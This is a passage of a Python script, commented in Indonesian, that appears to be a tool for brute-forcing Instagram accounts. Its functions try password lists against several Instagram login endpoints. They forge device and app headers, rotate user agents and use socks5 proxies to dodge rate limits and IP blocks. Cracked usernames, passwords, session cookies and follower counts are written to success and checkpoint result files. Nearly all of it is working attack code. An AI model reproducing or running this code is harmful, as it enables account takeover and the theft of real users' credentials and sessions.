                tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
                tree.add(Panel.fit(f"{N2}{cookie}{P2}"))
                prints(tree)
                open(f"result/success-{day}.txt","a").write(f'{username}|{password}|{pengikut}|{mengikut}\n')
                break
            elif 'challenge_required' in str(response2.text):
                Cp+=1
                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
                x_jason = x.json()["data"]["user"]
                pengikut = x_jason["edge_followed_by"]["count"]
                mengikut = x_jason["edge_follow"]["count"]
                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
                tree = Tree("")
                tree.add(Panel.fit(f"{K2}{username} {P2}| {K2}{password}"))
                tree.add(f"{P2}Followers : {K2}{pengikut}")
                tree.add(f"{P2}Following : {K2}{mengikut}")
                tree.add(f"{P2}Postingan : {K2}{postingan}")
                prints(tree)
                open(f"result/checkpoint-{day}.txt","a").write(f'{username}|{password}|{pengikut}|{mengikut}\n')
                break
            else:
                continue
        #except Exception as e:print(e)
        except requests.exceptions.ConnectionError:time.sleep(20)
    Loop+=1

def Crack_w(username, memek):
    global Ok, Cp, Loop
    ua = InstaIgeh()
    sys.stdout.write(f"\r{Colors.BOLD}[Instagram App]{Colors.ENDC} {Colors.OKCYAN}[Proses: {Loop}/{len(Uuid)}/{Colors.OKCYAN}{str(username)[:6]}]{Colors.ENDC} Success: {Colors.OKGREEN}{Ok}{Colors.ENDC} Checkpoint: {Colors.WARNING}{Cp}{Colors.ENDC}"),
    sys.stdout.flush()
    try:
        for pw in memek:
            p = s.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
            header = {
                "Content-Type": "text/html; charset=utf-8",
                "Allow": "POST",
                "ig-set-password-encryption-web-key-id": "92",
                "ig-set-password-encryption-web-pub-key": "7fe984d1d0cfc66e3ccf4b22b03c4935c4b9a4b8492baca12260a8345f11b67a",
                "ig-set-password-encryption-web-key-version": "10",
                "X-Robots-Tag": "noindex",
                "Date": "Thu, 16 Jan 2025 01:48:16 GMT",
                "Vary": "Accept-Language, Cookie",
                "Content-Language": "en",
                "Strict-Transport-Security": "max-age=31536000",
                "Cache-Control": "private, no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "x-ig-snorlax-chunk-sleepms": "100",
                "X-Frame-Options": "SAMEORIGIN",
                "Content-Security-Policy": "HTTP/1.1",
                "Cross-Origin-Embedder-Policy-Report-Only": "require-corp;report-to=\"coep\"",
                "Report-To": "{\"group\":\"coop\",\"max_age\":2592000,\"endpoints\":[{\"url\":\"https://coop/\"}]}",
                "Cross-Origin-Resource-Policy": "cross-origin",
                "Cross-Origin-Opener-Policy": "same-origin-allow-popups;report-to=\"coop\"",
                "X-Content-Type-Options": "nosniff",
                "X-XSS-Protection": "0",
                "x-ig-push-state": "c2",
                "x-ig-cache-control": "no-cache",
                "x-aed": "335",
                "x-ig-request-elapsed-time-ms": "52",
                "x-ig-peak-v2": "0",
                "x-ig-peak-time": "1",
                "x-stack": "distillery",
                "x-perf-stats": "43057976;29258;51190",
                "x-asbd-id":"129477",
                "x-csrftoken": p.cookies.get_dict()['csrftoken'],
                "x-ig-app-id":"936619743392459",
                "x-ig-www-claim": "hmac.AR1JRO-r750XvzzKF-U-WVrXk1HS89qTOUcvnN6u9DpRZdOR",
                "x-ig-device-id": p.cookies.get_dict()['ds_user_id'],
                "X-IG-Connection-Type": "WIFI",
                "X-IG-Bandwidth-Speed": "10000000",
                "X-IG-Bandwidth-Total": "10000000",
                "X-IG-Connection-Speed": "10000000",
                "x-ig-origin-region": "cco",
                "Proxy-Status": p.cookies.get_dict()['ig_pr'],
            }

            data = {
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{random.randint(1000000000, 99999999999)}:{pw}",
                "username": username,
                "queryParams": "{}",
                "optIntoOneTap": 'false',
                "stopDeletionNonce": "",
                "trustedDeviceRecords": "{}"}
            respon= s.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = header, data = data, allow_redirects = False)
            meledak_code = json.loads(respon.text)
            if 'logged_in_user' in str(meledak_code) or 'href="https://i.instagram.com/accounts/onetap/?next=%2F"' in str(meledak_code) or 'sessionld' in str(meledak_code):
                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
                x_jason = x.json()["data"]["user"]
                nama = x_jason["full_name"]
                pengikut = x_jason["edge_followed_by"]["count"]
                mengikut = x_jason["edge_follow"]["count"]
                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
                cookie = ";".join([key+"="+value.replace('"','') for key, value in s.cookies.get_dict().items()])
                tree = Tree(Panel.fit(f"{H2}{username} {P2}| {H2}{pw}"))
                tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
                tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
                tree.add(Panel.fit(f"{N2}{cookie}{P2}"))
                prints(tree)
                open(f"result/success-{day}.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
                break
            elif 'challenge_required' in str(meledak_code):
                Ok+=1
                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
                x_jason = x.json()["data"]["user"]
                nama = x_jason["full_name"]
                pengikut = x_jason["edge_followed_by"]["count"]
                mengikut = x_jason["edge_follow"]["count"]
                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
                tree = Tree("")
                tree.add(Panel.fit(f"{K2}{username} {P2}| {K2}{pw}"))
                tree.add(f"{P2}Followers : {K2}{pengikut}")
                tree.add(f"{P2}Following : {K2}{mengikut}")
                tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{ua}") 
                prints(tree)
                open(f"result/checkpoint-{day}.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
                break
            else:
                continue
        Loop+=1
    except requests.ConnectionError:
        time.sleep(10)


def Crack_x(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\r{Colors.BOLD}[Instagram App]{Colors.ENDC} {Colors.OKCYAN}[Proses: {Loop}/{len(Uuid)}/{Colors.OKCYAN}{str(username)[:6]}]{Colors.ENDC} Success: {Colors.OKGREEN}{Ok}{Colors.ENDC} Checkpoint: {Colors.WARNING}{Cp}{Colors.ENDC}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = aguss()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, fullname = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"\r{P}account: {fullname[:10]}\nUsername: {username}\nPassword: {password}\nPengikut: {peng}\nMengikuti: {meng}\nPostingan: {post}\nCookies: {cookies}")
				open(f"result/success-{day}.txt","a").write(f'{username}|{password}|{peng}|{meng}\n')
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, fullname = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"\r{K}account: {fullname[:10]}\nUsername: {username}\nPassword: {password}\nPengikut: {peng}\nMengikuti: {meng}\nPostingan: {post}")
				open(f"result/checkpoint-{day}.txt","a").write(f'{username}|{password}|{peng}|{meng}\n')
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1
        
def checkAPI(usr,pwd):
    try:
        ts = calendar.timegm(current_GMT)
        s = requests.Session()
        proxy = {'http': 'socks5://'+random.choice(proxxy)}
        token=s.get("https://z-p42.www.instagram.com/accounts/login",headers={"user-agent":InstaIgeh()}).content
        crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
        s.headers.update({
            'authority': 'www.instagram.com',
            'connection': 'keep-alive',
            'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
            'x-ig-app-id': '1217981644879628',
            'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
                'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?1',
            'x-instagram-ajax': 'c6412f1b1b7b',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'x-csrftoken': crf_token,
            'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
            'x-asbd-id': '198387',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
        })

        param={
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
                "username": usr,
                "optIntoOneTap": False,
                "queryParams": "{}",
                "stopDeletionNonce": "",
                "trustedDeviceRecords": "{}"
        }
        x = s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
        x_jason=json.loads(x.text)
        if "userId" in x_jason:
            x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(usr),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
            x_jason = x.json()["data"]["user"]
            nama = x_jason["full_name"]
            pengikut = x_jason["edge_followed_by"]["count"]
            mengikut = x_jason["edge_follow"]["count"]
            postingan = x_jason["edge_owner_to_timeline_media"]["count"]
            tree = Tree(Panel.fit(f"{H2}{usr} {P2}| {H2}{pwd}")).add(Panel.fit(f"Username : {nama}"))
            tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
            tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
            prints(tree)
        elif 'checkpoint_url' in x.text:
            nama = x_jason["full_name"]
            pengikut = x_jason["edge_followed_by"]["count"]
            mengikut = x_jason["edge_follow"]["count"]
            postingan = x_jason["edge_owner_to_timeline_media"]["count"]
            tree = Tree("")
            tree.add(Panel.fit(f"{K2}{usr} {P2}| {K2}{pwd}"))
            tree.add(f"{P2}Username : {K2}{nama}")
            tree.add(f"{P2}Followers : {K2}{pengikut}")
            tree.add(f"{P2}Following : {K2}{mengikut}")
            tree.add(f"{P2}Postingan : {K2}{postingan}")
            prints(tree)
        elif 'Please wait a few minutes' in str(x.text):
            sys.stdout.write(f"\r {U}Please wait a few minutes second");sys.stdout.flush();sleep(10)
            checkAPI(usr,pwd)
    except:
        checkAPI(usr,pwd)
if __name__ == "__main__":
    LoginCuyy()